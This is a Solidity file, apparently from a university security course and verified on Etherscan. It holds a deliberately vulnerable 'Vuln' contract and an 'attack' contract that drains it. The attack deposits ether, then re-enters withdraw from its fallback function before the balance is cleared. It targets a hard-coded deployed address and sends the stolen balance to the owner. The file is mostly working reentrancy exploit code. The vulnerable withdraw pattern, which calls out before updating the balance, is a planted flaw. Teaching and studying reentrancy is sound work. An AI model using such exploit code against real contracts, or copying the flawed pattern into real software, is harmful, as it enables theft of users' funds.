/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call{value: balances[msg.sender]}("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}


contract attack {
    //address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d))
    //0x42F790b586F9A9fD0e8F8F08a9Edc8A9689949C9
    //0x6a540d0FE22b13A21C509849a5d8791a9A3EDd24
    //0x929069D69d0caa9C6D5a4D498D9aC0E0ca549f54
    
    function attack_target() external payable{
        // require(msg.value > 0 ether);
        Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d)).deposit{value: msg.value}();
        Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d)).withdraw();

        
    }

    uint256 count = 0;
    fallback() external payable {   
        if (count < 2) {
            count += 1;
            Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d)).withdraw();
        }
    }

    function printBalance() public view returns (uint){
        return address(this).balance;
    }

    address contract_address;
    address owner;
    
    constructor() public { // will be called only once upon initializing the contract
            owner = msg.sender;
            contract_address = address(this);
    }

    function collect() public {
            if (msg.sender == owner) {
                require(msg.sender.send(contract_address.balance));
            }
    }

}